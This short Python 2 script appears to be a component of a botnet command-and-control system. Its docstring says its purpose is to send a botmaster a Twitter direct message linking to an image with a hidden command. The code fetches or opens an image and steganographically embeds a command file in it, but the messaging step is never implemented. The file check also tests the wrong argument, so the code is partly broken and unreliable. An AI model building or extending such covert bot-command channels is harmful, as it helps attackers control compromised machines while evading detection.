#!/usr/bin/python

import urllib, Image, StringIO, os, sys

from modules import bmpsteg

"""
This sscript should result in a DM to a botmaster containing a link to an image storing a command
"""

def usage():
	print 'usage: python command.py <botmaster twitter account> <url|path to src img> <path to command file>'

if __name__ == "__main__":
	try:
		if os.path.isfile(sys.argv[1]):
			img = Image.open(StringIO.StringIO(open(sys.argv[2], 'r').read()))
		else:
			img = Image.open(StringIO.StringIO(urllib.urlopen(sys.argv[2]).read()))

		if not os.path.isfile(sys.argv[3]):
			usage()
			sys.exit(1)

		src = StringIO.StringIO()
		img.save(src, format="BMP")

		dst = StringIO.StringIO()

		msg = StringIO.StringIO(open(sys.argv[3], 'r').read())

		bmpsteg.put(src, dst, msg)

		

	except Exception as e:
		print e
		usage()






